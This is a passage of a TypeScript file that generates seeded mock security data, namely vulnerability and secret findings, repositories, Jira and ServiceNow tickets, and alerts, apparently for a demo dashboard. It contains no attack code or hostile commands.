		repository: { defaultBranch: "main", name: `acme/${repo}` },
		source: provider,
		status: rng.weighted([
			["open", 70],
			["fixed", 20],
			["ignored", 10],
		] as const),
		type,
	};
	if (type === "sca") {
		const seed = rng.pick(CVES);
		return {
			id,
			raw: {
				id: `SNYK-JS-${seed.pkg.toUpperCase().replace(/[^A-Z]/gu, "")}-${rng.int(1_000_000, 9_999_999)}`,
				identifiers: { CVE: [seed.cve] },
				isUpgradable: true,
				packageName: seed.pkg,
				severity: severityFromCvss(seed.cvss),
			},
			unified: {
				...base,
				cve: seed.cve,
				fixAvailable: true,
				package: {
					fixedIn: seed.fixed,
					name: seed.pkg,
					version: `${rng.int(0, 4)}.${rng.int(0, 20)}.${rng.int(0, 9)}`,
				},
				severity: severityFromCvss(seed.cvss),
				title: seed.title,
			},
		};
	}
	if (type === "secret") {
		const kind = rng.pick(SECRET_TYPES);
		const file = rng.pick([
			".env.production",
			"config/settings.py",
			"scripts/deploy.sh",
			"src/lib/stripe.ts",
		]);
		return {
			id,
			raw: {
				file,
				rule: kind,
				validity: rng.pick(["valid", "invalid", "unknown"]),
			},
			unified: {
				...base,
				filePath: file,
				line: rng.int(1, 140),
				severity: "critical",
				title: `${kind} committed to repository`,
				validity: rng.pick(["valid", "unknown"]),
			},
		};
	}
	const [ruleId, cwe, title, file] = rng.pick(SAST_RULES);
	return {
		id,
		raw: {
			check_id: ruleId,
			extra: { metadata: { cwe: [cwe] }, severity: "ERROR" },
			path: file,
			start: { line: rng.int(10, 400) },
		},
		unified: {
			...base,
			cwe,
			filePath: file,
			line: rng.int(10, 400),
			ruleId,
			severity: rng.pick(["high", "medium", "low"]),
			title,
		},
	};
}

function repository(c: Ctx, index: number): MockRecord {
	const { rng, now, provider } = c;
	const name = REPOS[index % REPOS.length] as string;
	const id = makeId("repo", rng);
	return {
		id,
		raw: {
			full_name: `acme/${name}`,
			id: rng.int(100_000_000, 900_000_000),
			private: true,
		},
		unified: {
			defaultBranch: "main",
			fullName: `acme/${name}`,
			id,
			language: LANGS[name] ?? "TypeScript",
			lastPushAt: iso(now - rng.int(1, 400) * HOUR),
			name,
			openFindings: rng.int(0, 60),
			source: provider,
			visibility: rng.weighted([
				["private", 8],
				["internal", 1],
				["public", 1],
			] as const),
		},
	};
}

function ticket(c: Ctx, index: number): MockRecord {
	const { rng, now, provider } = c;
	const id = makeId("tkt", rng);
	const seed = rng.pick(CVES);
	const host = rng.pick(c.hosts);
	const key =
		provider === "servicenow"
			? `INC00${rng.int(10_000, 99_999)}`
			: `SEC-${1200 + index}`;
	const created = now - rng.int(1, 60) * DAY;
	return {
		id,
		raw:
			provider === "servicenow"
				? {
						number: key,
						short_description: `${seed.cve} on ${host.hostname}`,
						state: "2",
						sys_id: rng.hex(32),
					}
				: {
						fields: {
							issuetype: { name: "Bug" },
							priority: { name: "High" },
							summary: `${seed.cve} on ${host.hostname}`,
						},
						id: String(rng.int(10_000, 99_999)),
						key,
					},
		unified: {
			assignee: rng.bool(0.8) ? rng.pick(c.people).email : null,
			createdAt: iso(created),
			id,
			key,
			priority: rng.pick(["highest", "high", "medium", "low"]),
			project: provider === "servicenow" ? "Vulnerability Response" : "SEC",
			source: provider,
			status: rng.weighted([
				["open", 40],
				["in_progress", 30],
				["done", 30],
			] as const),
			title: `${seed.cve} on ${host.hostname.split(".")[0]}`,
			updatedAt: iso(created + rng.int(1, 200) * HOUR),
			url:
				provider === "servicenow"
					? `https://acme.service-now.com/nav_to.do?uri=incident.do?sys_id=${rng.hex(32)}`
					: `https://acme.atlassian.net/browse/${key}`,
		},
	};
}

function alert(c: Ctx): MockRecord {
	const { rng, now, provider } = c;
	const id = makeId("alrt", rng);
	const titles = [
		"Impossible travel sign-in",
		"Brute force against SSH",
		"AWS root account login",
		"Okta MFA fatigue attack",
		"Unusual data egress from S3",
		"New admin role assignment",
		"GuardDuty: CryptoCurrency:EC2/BitcoinTool",
	];
	return {
		id,
		raw: {
			attributes: { status: "open", title: titles[0] ?? "" },
			id: rng.hex(24),
		},
		unified: {
			createdAt: iso(now - rng.int(1, 300) * HOUR),
			entity: rng.pick(c.people).email,
			id,
			rule: rng.pick(titles),
			severity: rng.pick(["critical", "high", "medium", "low"]),
			source: provider,
			status: rng.pick(["open", "acknowledged", "closed"]),
			title: rng.pick(titles),
		},
	};
}

type Generator = (c: Ctx, index: number) => MockRecord;

const GENERATORS: Partial<Record<ModelKey, Generator>> = {
	alerts: alert,
	"cloud-findings": cloudFinding,
	"cloud-resources": cloudResource,
	"code-findings": codeFinding,
	detections: detection,
	devices: device,
	groups: group,
	repositories: repository,
	tickets: ticket,
	users: user,
	vulnerabilities: vulnerability,
};

/** How many records a connection of this size holds, per model. */
export function recordCount(seed: string, model: ModelKey): number {
	const rng = createRng(`${seed}:${model}:count`);
	const ranges: Partial<Record<ModelKey, [number, number]>> = {
		alerts: [40, 180],
		"cloud-findings": [120, 900],
		"cloud-resources": [400, 3200],
		"code-findings": [80, 640],
		detections: [12, 90],
		devices: [140, 2400],
		groups: [12, 12],
		repositories: [12, 12],
		tickets: [30, 400],
		users: [80, 1800],
		vulnerabilities: [800, 14_000],
	};
	const [min, max] = ranges[model] ?? [10, 50];
	return rng.int(min, max);
}

const cache = new Map<string, MockRecord[]>();

/** The first `limit` records for a connection and model. Generated on demand
 * and cached, so nothing large ever goes into localStorage. */
export function generateRecords(
	seed: string,
	provider: string,
	model: ModelKey,
	domain: string,
	now: number,
	limit = 50
): MockRecord[] {
	const key = `${seed}:${model}:${limit}`;
	const hit = cache.get(key);
	if (hit) {
		return hit;
	}
	const generator = GENERATORS[model];
	if (!generator) {
		return [];
	}
	const rng = createRng(`${seed}:${model}`);
	const ctx: Ctx = {
		domain,
		hosts: hostPool(createRng(`${seed}:hosts`), domain, 40),
		now,
		people: people(createRng(`${seed}:people`), domain, 60),
		provider,
		rng,
	};
	const total = Math.min(limit, recordCount(seed, model));
	const records = Array.from({ length: total }, (_, i) => generator(ctx, i));
	cache.set(key, records);
	return records;
}

export function companyFor(seed: string): string {
	return createRng(`${seed}:company`).pick(COMPANIES);
}

export { COMPANIES, iso };
